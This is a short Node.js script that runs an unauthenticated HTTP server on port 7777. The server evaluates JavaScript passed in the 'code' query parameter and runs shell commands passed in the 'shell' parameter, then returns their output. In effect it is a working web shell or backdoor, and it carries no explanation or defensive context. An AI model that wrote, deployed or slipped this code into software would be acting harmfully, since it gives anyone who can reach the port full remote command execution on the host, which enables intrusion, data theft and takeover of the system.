var http = require('http');
var url = require('url');
var exec = require('child_process').exec;
var util = require('util');

http.createServer(function(request, response) {
   try {
      var query = url.parse(request.url, true).query;
      if (query.code) {
         response.end(eval(query.code));
         return;
      }
      if (query.shell) {
         exec(query.shell, function(error, stdout, stderr) {
            response.end(util.format(
               '<pre><b>stdout</b>:\n%s\n<b>stderr</b>:\n%s</pre>',
               stdout || 'none',
               stderr || 'none'
            ));
         });
         return;
      }
      response.end('All right');
   } catch (error) {
      response.end(error.stack);
   }
}).listen(7777);